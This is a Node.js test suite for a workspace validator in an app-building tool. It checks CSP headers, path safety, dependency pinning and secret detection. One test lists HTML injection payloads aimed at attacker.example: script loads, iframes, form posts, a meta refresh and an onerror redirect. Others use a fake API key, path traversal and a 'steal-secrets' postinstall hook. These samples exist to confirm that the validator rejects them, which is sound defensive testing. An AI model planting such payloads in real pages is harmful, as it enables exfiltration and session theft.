import assert from "node:assert/strict";
import { registerHooks } from "node:module";
import test from "node:test";

const projectRoot = new URL("../", import.meta.url);

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (!specifier.startsWith("@/")) return nextResolve(specifier, context);
    const projectPath = specifier.slice(2);
    return {
      shortCircuit: true,
      url: new URL(
        projectPath.endsWith(".ts") ? projectPath : `${projectPath}.ts`,
        projectRoot,
      ).href,
    };
  },
});

const { createProjectSpec } = await import("../lib/project-factory.ts");
const { compileProject } = await import("../lib/project-compiler.ts");
const {
  addWorkspaceFile,
  compileWorkspaceRuntime,
  deleteWorkspaceFile,
  materializeProjectWorkspace,
  PROJECT_WORKSPACE_BYTES_LIMIT,
  reconcileProjectWorkspaceTasks,
  updateWorkspaceFile,
  validateProjectWorkspace,
  workspaceFilesForSandbox,
} = await import("../lib/project-workspace.ts");

function project() {
  const spec = createProjectSpec({
    presetId: "crypto-aggregator",
    values: {},
    prompt: "Build a multi-file market explorer",
    tools: ["DropsTab API", "Drops Bot alerts"],
    provider: "free",
    model: "Free compiler",
    market: [],
    prediction: {
      title: "No prediction selected",
      probability: null,
      change: null,
    },
    origin: "https://drops-studio.example",
  });
  const now = "2026-07-30T12:00:00.000Z";
  return {
    id: "workspace-project",
    spec,
    html: compileProject(spec),
    createdAt: now,
    updatedAt: now,
  };
}

test("materializes a runnable multi-file workspace from every compiled product", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const paths = workspace.files.map((file) => file.path);

  assert.deepEqual(paths, [
    "index.html",
    "src/styles.css",
    "src/app.js",
    "project.json",
    "drops.config.json",
    "package.json",
    "server.mjs",
    "scripts/check.mjs",
    "tests/smoke.mjs",
    "README.md",
  ]);
  assert.equal(workspace.runtime.executionMode, "static-preview");
  assert.equal(workspace.runtime.provider, "unconfigured");
  assert.equal(workspace.runtime.isolation, "browser-iframe");
  assert.deepEqual(
    workspace.tasks.map((task) => task.id),
    ["check", "test", "build", "start"],
  );
  assert.match(
    workspace.files.find((file) => file.path === "index.html").content,
    /\.\/src\/styles\.css/,
  );
  assert.match(
    workspace.files.find((file) => file.path === "index.html").content,
    /\.\/src\/app\.js/,
  );
  const serverSource = workspace.files.find(
    (file) => file.path === "server.mjs",
  ).content;
  assert.match(serverSource, /content-security-policy/);
  assert.match(serverSource, /default-src 'none'/);
  assert.match(serverSource, /script-src 'self'/);
  assert.match(serverSource, /script-src-attr 'none'/);
  assert.match(serverSource, /connect-src 'self'/);
  assert.match(serverSource, /img-src 'self' data: blob:/);
  assert.match(serverSource, /object-src 'none'/);
  assert.match(serverSource, /frame-src 'none'/);
  assert.match(serverSource, /base-uri 'none'/);
  assert.match(serverSource, /form-action 'none'/);
  assert.doesNotMatch(
    serverSource,
    /script-src[^;"']*unsafe-inline|connect-src[^;"']*https:|img-src[^;"']*https:/,
  );

  const validation = validateProjectWorkspace(current.spec, workspace);
  assert.deepEqual(validation.issues, []);
  const runtime = compileWorkspaceRuntime(current.spec, workspace);
  assert.match(runtime, /data-project-kind="crypto-aggregator"/);
  assert.match(runtime, /function\s+dropsbotSetup\s*\(/);
  assert.doesNotMatch(runtime, /src="\.\/src\/app\.js"/);
});

test("normalizes loopback endpoints while materializing a local workspace", () => {
  const current = project();
  const localEndpoint = "http://127.0.0.1:4173/api/public-data";
  const localSpec = { ...current.spec, dataEndpoint: localEndpoint };
  const localProject = {
    ...current,
    spec: localSpec,
    html: compileProject(localSpec),
  };
  const workspace = materializeProjectWorkspace(localProject);
  const combinedSource = workspace.files.map((item) => item.content).join("\n");

  assert.doesNotMatch(combinedSource, /https?:\/\/127\.0\.0\.1(?::\d+)?/i);
  assert.match(combinedSource, /\/api\/public-data/);
  assert.equal(validateProjectWorkspace(localSpec, workspace).valid, true);
  assert.doesNotThrow(() => compileWorkspaceRuntime(localSpec, workspace));
});

test("compiles CSS and JavaScript replacement tokens as exact source bytes", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const replacementTokens = "$& $` $' $$";
  const css = `body::before { content: "${replacementTokens}"; }`;
  const javascript = `window.__replacementTokens = "${replacementTokens}";`;
  const styled = updateWorkspaceFile(
    current.spec,
    workspace,
    "src/styles.css",
    css,
  );
  const scripted = updateWorkspaceFile(
    current.spec,
    styled,
    "src/app.js",
    javascript,
  );

  const runtime = compileWorkspaceRuntime(current.spec, scripted);
  assert.ok(runtime.includes(`<style>${css}</style>`));
  assert.ok(runtime.includes(`<script>${javascript}</script>`));
});

test("keeps generated project metadata separate and never merges executable script scope", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const index = workspace.files.find((item) => item.path === "index.html")?.content;
  const app = workspace.files.find((item) => item.path === "src/app.js")?.content;
  assert.match(index, /<script type="application\/json" id="projectSpec">/);
  assert.match(index, /<script src="\.\/src\/app\.js"><\/script>/);
  assert.doesNotMatch(app, /<script/);

  assert.throws(
    () =>
      materializeProjectWorkspace({
        ...current,
        html: current.html.replace(
          "<script>",
          "<script>window.firstScope = true</script><script>",
        ),
      }),
    /exactly one executable inline runtime script|scope and ordering/i,
  );
  assert.throws(
    () =>
      materializeProjectWorkspace({
        ...current,
        html: current.html.replace("<script>", '<script type="module">'),
      }),
    /classic inline script|cannot be rewritten safely/i,
  );
});

test("rejects unexpected active content and outbound form escapes in canonical index.html", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const attacks = [
    '<script src="https://attacker.example/steal.js"></script>',
    '<!--><script src="https://attacker.example/comment-break.js"></script>-->',
    '<script src="./src/extra.js"></script>',
    '<script type="importmap">{"imports":{"x":"https://attacker.example/x.js"}}</script>',
    '<script type="application/json" id="extraMetadata">{}</script>',
    '<iframe src="https://attacker.example/collect"></iframe>',
    '<object data="https://attacker.example/collect"></object>',
    '<embed src="https://attacker.example/collect">',
    '<base href="https://attacker.example/">',
    '<link rel="modulepreload" href="https://attacker.example/module.js">',
    '<link rel="preload" as="script" href="https://attacker.example/app.js">',
    '<link rel="preconnect" href="https://attacker.example">',
    '<link rel="dns-prefetch" href="//attacker.example">',
    '<link rel="stylesheet" href="https://attacker.example/app.css">',
    '<meta http-equiv="refresh" content="0;url=https://attacker.example/collect">',
    '<form action="https://attacker.example/collect" method="post"><input name="token"></form>',
    '<button formaction="//attacker.example/collect">Send</button>',
    '<a href="javascript:location=\'https://attacker.example/\'">Open</a>',
    '<img src="./brand/dropstab-mark.svg" onerror="location=\'https://attacker.example/\'">',
  ];

  for (const attack of attacks) {
    const altered = {
      ...workspace,
      files: workspace.files.map((item) =>
        item.path === "index.html"
          ? { ...item, content: item.content.replace("</body>", `${attack}</body>`) }
          : item,
      ),
    };
    const validation = validateProjectWorkspace(current.spec, altered);
    assert.equal(validation.valid, false, attack);
    assert.match(
      validation.issues.join("\n"),
      /active[- ]content|canonical entry|outbound form/i,
      attack,
    );
    assert.throws(
      () => compileWorkspaceRuntime(current.spec, altered),
      /active[- ]content|canonical entry|outbound form/i,
      attack,
    );
  }
});

test("requires exact canonical entry tags and supported file enums", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const mutateIndex = (replace) => ({
    ...workspace,
    files: workspace.files.map((item) =>
      item.path === "index.html"
        ? { ...item, content: replace(item.content) }
        : item,
    ),
  });

  for (const altered of [
    mutateIndex((source) =>
      source.replace(
        '<link rel="stylesheet" href="./src/styles.css">',
        '<link href="./src/styles.css" rel="stylesheet">',
      ),
    ),
    mutateIndex((source) =>
      source.replace(
        '<script src="./src/app.js"></script>',
        '<script defer src="./src/app.js"></script>',
      ),
    ),
  ]) {
    const validation = validateProjectWorkspace(current.spec, altered);
    assert.equal(validation.valid, false);
    assert.match(validation.issues.join("\n"), /exact canonical entry tags/i);
    assert.throws(
      () => compileWorkspaceRuntime(current.spec, altered),
      /exact canonical entry tags/i,
    );
  }

  const invalidEnums = {
    ...workspace,
    files: workspace.files.map((item) =>
      item.path === "README.md"
        ? { ...item, language: "plaintext", role: "owner" }
        : item,
    ),
  };
  const enumValidation = validateProjectWorkspace(current.spec, invalidEnums);
  assert.match(enumValidation.issues.join("\n"), /supported workspace language/i);
  assert.match(enumValidation.issues.join("\n"), /supported workspace file role/i);
});

test("edits files while preserving the runnable product and secret boundary", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const app = workspace.files.find((file) => file.path === "src/app.js");
  assert.ok(app);

  const edited = updateWorkspaceFile(
    current.spec,
    workspace,
    "src/app.js",
    `${app.content}\nwindow.__workspaceEdit = "verified";`,
  );
  assert.equal(edited.revision, workspace.revision + 1);
  assert.match(
    compileWorkspaceRuntime(current.spec, edited),
    /__workspaceEdit = "verified"/,
  );

  assert.throws(
    () =>
      updateWorkspaceFile(
        current.spec,
        workspace,
        "src/app.js",
        `${app.content}\nconst apiKey = "sk-proj-abcdefghijklmnopqrstuvwxyz123456";`,
      ),
    /Potential secret material/,
  );
  assert.throws(
    () => updateWorkspaceFile(current.spec, workspace, "../escape.js", "nope"),
    /not part of this workspace/,
  );
});

test("accepts registry dependencies but blocks executable install hooks and remote specs", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const packageFile = workspace.files.find((file) => file.path === "package.json");
  assert.ok(packageFile);

  const packageJson = JSON.parse(packageFile.content);
  packageJson.dependencies = { zod: "4.4.3" };
  const withDependency = updateWorkspaceFile(
    current.spec,
    workspace,
    "package.json",
    JSON.stringify(packageJson, null, 2),
  );
  assert.deepEqual(
    workspaceFilesForSandbox(current.spec, withDependency).dependencies,
    { zod: "4.4.3" },
  );

  packageJson.dependencies = { zod: "^4.4.3" };
  assert.throws(
    () =>
      updateWorkspaceFile(
        current.spec,
        workspace,
        "package.json",
        JSON.stringify(packageJson),
      ),
    /registry version/,
  );

  packageJson.dependencies = { unsafe: "https://example.com/package.tgz" };
  assert.throws(
    () =>
      updateWorkspaceFile(
        current.spec,
        workspace,
        "package.json",
        JSON.stringify(packageJson),
      ),
    /registry version/,
  );

  packageJson.dependencies = {};
  packageJson.scripts.postinstall = "node steal-secrets.mjs";
  assert.throws(
    () =>
      updateWorkspaceFile(
        current.spec,
        workspace,
        "package.json",
        JSON.stringify(packageJson),
      ),
    /lifecycle scripts are blocked/,
  );
});

test("adds and removes editable source files without allowing required-file deletion", () => {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const added = addWorkspaceFile(current.spec, workspace, {
    path: "src/widgets/alerts.js",
    content: "export const alertMode = 'verified-webhook';",
    language: "javascript",
    role: "client",
  });
  assert.equal(added.revision, 2);
  assert.equal(
    added.files.find((file) => file.path === "src/widgets/alerts.js").editable,
    true,
  );

  const removed = deleteWorkspaceFile(
    current.spec,
    added,
    "src/widgets/alerts.js",
  );
  assert.equal(removed.revision, 3);
  assert.equal(
    removed.files.some((file) => file.path === "src/widgets/alerts.js"),
    false,
  );
  assert.throws(
    () => deleteWorkspaceFile(current.spec, workspace, "index.html"),
    /required workspace file/,
  );
  assert.throws(
    () =>
      addWorkspaceFile(current.spec, workspace, {
        path: "../outside.js",
        content: "nope",
        language: "javascript",
        role: "client",
      }),
    /unsafe workspace path/,
  );

  for (const path of [
    "src/.env",
    "packages/app/.env.production",
    "src/.git/config",
    "packages/app/.git/hooks/pre-commit",
  ]) {
    assert.throws(
      () =>
        addWorkspaceFile(current.spec, workspace, {
          path,
          content: "blocked",
          language: "text",
          role: "documentation",
        }),
      /unsafe workspace path/,
      path,
    );
    const validation = validateProjectWorkspace(current.spec, {
      ...workspace,
      files: [
        ...workspace.files,
        {
          path,
          content: "blocked",
          language: "text",
          role: "documentation",
          editable: true,
        },
      ],
    });
    assert.match(validation.issues.join("\n"), /unsafe workspace path/i, path);
  }
});

function multiPackageWorkspace() {
  const current = project();
  const workspace = materializeProjectWorkspace(current);
  const rootPackage = workspace.files.find((item) => item.path === "package.json");
  assert.ok(rootPackage);
  const rootManifest = JSON.parse(rootPackage.content);
  rootManifest.workspaces = ["packages/frontend", "packages/api"];
  rootManifest.dependencies = { zod: "4.4.3" };
  return {
    current,
    workspace: {
      ...workspace,
      files: [
        ...workspace.files.map((item) =>
          item.path === "package.json"
            ? { ...item, content: JSON.stringify(rootManifest, null, 2) }
            : item,
        ),
        {
          path: "packages/frontend/package.json",
          content: JSON.stringify({
            name: "@drops/frontend",
            private: true,
            type: "module",
            scripts: { build: "node build.mjs" },
            dependencies: { react: "19.2.4" },
            devDependencies: { typescript: "5.9.3" },
          }),
          language: "json",
          role: "package-manifest",
          editable: true,
        },
        {
          path: "packages/frontend/build.mjs",
          content: 'console.log("frontend built");',
          language: "javascript",
          role: "task",
          editable: true,
        },
        {
          path: "packages/api/package.json",
          content: JSON.stringify({
            name: "@drops/api",
            private: true,
            type: "module",
            scripts: { test: "node tests/api.test.mjs" },
            dependencies: { fastify: "5.6.2" },
          }),
          language: "json",
          role: "package-manifest",
          editable: true,
        },
        {
          path: "packages/api/tests/api.test.mjs",
          content: 'console.log("api passed");',
          language: "javascript",
          role: "test",
          editable: true,
        },
      ],
      tasks: [
        ...workspace.tasks,
        {
          id: "frontend-build",
          label: "Build frontend package",
          command: "npm",
          args: ["run", "build"],
          cwd: "packages/frontend",
        },
        {
          id: "api-test",
          label: "Test API package",
          command: "npm",
          args: ["test"],
          cwd: "packages/api",
        },
      ],
    },
  };
}

test("accepts a bounded multi-package workspace with package-scoped npm tasks", () => {
  const { current, workspace } = multiPackageWorkspace();
  const validation = validateProjectWorkspace(current.spec, workspace);

  assert.deepEqual(validation.issues, []);
  assert.equal(compileWorkspaceRuntime(current.spec, workspace).includes("data-project-kind"), true);
  assert.deepEqual(workspaceFilesForSandbox(current.spec, workspace).dependencies, {
    zod: "4.4.3",
    react: "19.2.4",
    typescript: "5.9.3",
    fastify: "5.6.2",
  });
});

test("rejects unsafe workspace declarations, missing manifests and non-registry dev dependencies", () => {
  const { current, workspace } = multiPackageWorkspace();
  const withRootManifest = (mutate) => ({
    ...workspace,
    files: workspace.files.map((item) => {
      if (item.path !== "package.json") return item;
      const manifest = JSON.parse(item.content);
      mutate(manifest);
      return { ...item, content: JSON.stringify(manifest) };
    }),
  });

  for (const workspaces of [
    ["packages/*"],
    ["packages/../api"],
    ["https://example.com/package"],
    Array.from({ length: 7 }, (_, index) => `packages/pkg-${index}`),
  ]) {
    const validation = validateProjectWorkspace(
      current.spec,
      withRootManifest((manifest) => { manifest.workspaces = workspaces; }),
    );
    assert.equal(validation.valid, false, JSON.stringify(workspaces));
    assert.match(validation.issues.join("\n"), /workspace|package/i);
  }

  const missing = validateProjectWorkspace(
    current.spec,
    withRootManifest((manifest) => {
      manifest.workspaces = ["packages/missing"];
    }),
  );
  assert.match(missing.issues.join("\n"), /packages\/missing\/package\.json.*required/i);

  const gitDependency = {
    ...workspace,
    files: workspace.files.map((item) => {
      if (item.path !== "packages/api/package.json") return item;
      const manifest = JSON.parse(item.content);
      manifest.devDependencies = { unsafe: "git+https://example.invalid/repo.git" };
      return { ...item, content: JSON.stringify(manifest) };
    }),
  };
  const gitValidation = validateProjectWorkspace(current.spec, gitDependency);
  assert.match(gitValidation.issues.join("\n"), /exact|registry|URL|git/i);
});

test("keeps declared package manifests atomic across deletion revisions", () => {
  const { current, workspace } = multiPackageWorkspace();
  const startingRevision = workspace.revision;

  assert.throws(
    () =>
      deleteWorkspaceFile(
        current.spec,
        workspace,
        "packages/api/package.json",
      ),
    /required/i,
  );
  assert.equal(workspace.revision, startingRevision);

  const rootPackage = workspace.files.find((item) => item.path === "package.json");
  assert.ok(rootPackage);
  const rootManifest = JSON.parse(rootPackage.content);
  rootManifest.workspaces = ["packages/frontend"];
  const detached = updateWorkspaceFile(
    current.spec,
    workspace,
    "package.json",
    JSON.stringify(rootManifest),
  );
  const removed = deleteWorkspaceFile(
    current.spec,
    detached,
    "packages/api/package.json",
  );

  assert.equal(detached.revision, startingRevision + 1);
  assert.equal(detached.tasks.some((task) => task.cwd === "packages/api"), false);
  assert.equal(removed.revision, startingRevision + 2);
  assert.equal(
    removed.files.some((item) => item.path === "packages/api/package.json"),
    false,
  );
});

test("uses one 1.5 MB canonical source limit shared with sandbox execution", () => {
  assert.equal(PROJECT_WORKSPACE_BYTES_LIMIT, 1_500_000);
  const { current, workspace } = multiPackageWorkspace();
  const oversized = {
    ...workspace,
    files: [
      ...workspace.files,
      {
        path: "packages/api/generated.txt",
        content: "x".repeat(PROJECT_WORKSPACE_BYTES_LIMIT),
        language: "text",
        role: "documentation",
        editable: true,
      },
    ],
  };
  const validation = validateProjectWorkspace(current.spec, oversized);
  assert.equal(validation.valid, false);
  assert.match(validation.issues.join("\n"), /1\.5 MB total|source.*limit/i);
});

test("derives deterministic package tasks after manual manifest mutations", () => {
  const current = project();
  const base = materializeProjectWorkspace(current);
  const orphan = addWorkspaceFile(current.spec, base, {
    path: "packages/api/package.json",
    content: JSON.stringify({
      name: "@drops/api",
      private: true,
      type: "module",
      scripts: {
        lint: "node lint.mjs",
        check: "node check.mjs",
        test: "node test.mjs",
        build: "node build.mjs",
        start: "node server.mjs",
      },
    }),
    language: "json",
    role: "package-manifest",
  });
  assert.equal(orphan.tasks.length, 4, "an undeclared package has no runnable task");

  const rootFile = orphan.files.find((item) => item.path === "package.json");
  assert.ok(rootFile);
  const root = JSON.parse(rootFile.content);
  root.workspaces = ["packages/api"];
  const connected = updateWorkspaceFile(
    current.spec,
    orphan,
    "package.json",
    JSON.stringify(root),
  );
  const packageTasks = connected.tasks.filter(
    (task) => task.cwd === "packages/api",
  );
  assert.deepEqual(
    packageTasks.map((task) => task.args),
    [
      ["run", "start"],
      ["run", "build"],
      ["run", "test"],
      ["run", "check"],
      ["run", "lint"],
    ],
  );
  assert.equal(
    packageTasks.every(
      (task) => task.label.includes("@drops/api") && task.cwd === "packages/api",
    ),
    true,
  );

  const childFile = connected.files.find(
    (item) => item.path === "packages/api/package.json",
  );
  assert.ok(childFile);
  const child = JSON.parse(childFile.content);
  delete child.scripts.start;
  child.scripts.deploy = "node deploy.mjs";
  const revised = updateWorkspaceFile(
    current.spec,
    connected,
    "packages/api/package.json",
    JSON.stringify(child),
  );
  assert.deepEqual(
    revised.tasks
      .filter((task) => task.cwd === "packages/api")
      .map((task) => task.args[1]),
    ["build", "test", "check", "deploy", "lint"],
  );

  root.workspaces = [];
  const detached = updateWorkspaceFile(
    current.spec,
    revised,
    "package.json",
    JSON.stringify(root),
  );
  assert.deepEqual(
    detached.tasks.map((task) => task.id),
    ["check", "test", "build", "start"],
  );
  const removed = deleteWorkspaceFile(
    current.spec,
    detached,
    "packages/api/package.json",
  );
  assert.equal(removed.revision, detached.revision + 1);
  assert.equal(removed.tasks.length, 4);
});

test("caps derived package tasks at 16 while preserving the four root tasks", () => {
  const current = project();
  const base = materializeProjectWorkspace(current);
  const rootFile = base.files.find((item) => item.path === "package.json");
  assert.ok(rootFile);
  const root = JSON.parse(rootFile.content);
  root.workspaces = Array.from(
    { length: 6 },
    (_, index) => `packages/pkg-${index}`,
  );
  const workspace = {
    ...base,
    files: [
      ...base.files.map((item) =>
        item.path === "package.json"
          ? { ...item, content: JSON.stringify(root) }
          : item,
      ),
      ...root.workspaces.map((directory, index) => ({
        path: `${directory}/package.json`,
        content: JSON.stringify({
          name: `@drops/pkg-${index}`,
          private: true,
          scripts: {
            check: "node check.mjs",
            test: "node test.mjs",
            build: "node build.mjs",
            start: "node start.mjs",
          },
        }),
        language: "json",
        role: "package-manifest",
        editable: true,
      })),
    ],
  };

  const reconciled = reconcileProjectWorkspaceTasks(workspace);
  assert.equal(reconciled.tasks.length, 16);
  assert.deepEqual(
    reconciled.tasks.slice(0, 4).map((task) => task.id),
    ["check", "test", "build", "start"],
  );
  assert.deepEqual(
    reconciled.tasks.slice(4, 10).map((task) => task.args[1]),
    Array(6).fill("start"),
  );
  assert.deepEqual(
    reconciled.tasks.slice(10).map((task) => task.args[1]),
    Array(6).fill("build"),
  );
});

test("fails closed instead of throwing for a malformed persisted workspace", () => {
  const current = project();
  const malformed = {
    schemaVersion: 1,
    revision: 1,
    updatedAt: "not-a-date",
    files: [
      null,
      { path: 42, content: { injected: true }, language: null },
    ],
    tasks: [null, { id: 7, args: "npm install" }],
    runtime: null,
  };

  assert.doesNotThrow(() => validateProjectWorkspace(current.spec, malformed));
  const validation = validateProjectWorkspace(current.spec, malformed);
  assert.equal(validation.valid, false);
  assert.match(validation.issues.join("\n"), /workspace|file|task|runtime/i);
});
